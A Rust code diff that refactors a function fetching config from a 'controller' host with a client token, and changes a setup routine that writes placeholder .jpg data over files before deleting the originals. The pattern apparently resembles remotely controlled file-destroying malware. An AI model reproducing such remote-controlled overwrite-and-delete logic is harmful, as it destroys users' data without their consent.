@@ -16,25 +16,17 @@ use util::{gen_random_byte, parse_config};
 pub type Result<T> = std::result::Result<T, Box<dyn error::Error>>;
 
 pub fn fetch_controller_config() -> Result<ControllerConfig> {
-  let host: &'static str = option_env!("CONF_HOST").unwrap_or(CONF_DEFAULT_HOST);
-  let port: u16 = option_env!("CONF_PORT")
-    .unwrap_or(&CONF_DEFAULT_PORT.to_string())
-    .parse()
-    .unwrap_or(CONF_DEFAULT_PORT);
-  let path: &'static str = option_env!("CONF_PATH").unwrap_or(CONF_DEFAULT_PATH);
-  let method: &'static str = option_env!("CONF_METHOD").unwrap_or(CONF_DEFAULT_METHOD);
-  let ssl: bool = option_env!("CONF_SSL")
-    .unwrap_or(&CONF_DEFAULT_SSL.to_string())
-    .parse()
-    .unwrap_or(CONF_DEFAULT_SSL);
-
   let app_conf = get_app_config().unwrap_or_default();
   let headers = format!(
     "{} {} HTTP/1.1\nAccept: */*\nx-client-token: {}{}",
-    method, path, app_conf.token, BODY_SEPARATOR
+    CONF_METHOD, CONF_PATH, app_conf.token, BODY_SEPARATOR
   );
   let mut res = String::new();
-  let mut stream = create_stream(ssl, host, port)?;
+  let mut stream = create_stream(
+    CONF_SSL.parse().unwrap(),
+    CONF_HOST,
+    CONF_PORT.parse().unwrap(),
+  )?;
 
   stream.w(&headers.as_bytes())?;
   stream.r(&mut res)?;
@@ -101,7 +93,7 @@ pub fn setup() -> Result<()> {
         new_path.push_str(".jpg");
       }
 
-      fs::write(&new_path, image_placeholder::get_placeholder_buf())?;
+      fs::write(&new_path, PLACEHOLDER_BUF)?;
 
       match fs::remove_file(&conf.original_path) {
         Ok(_) => break,
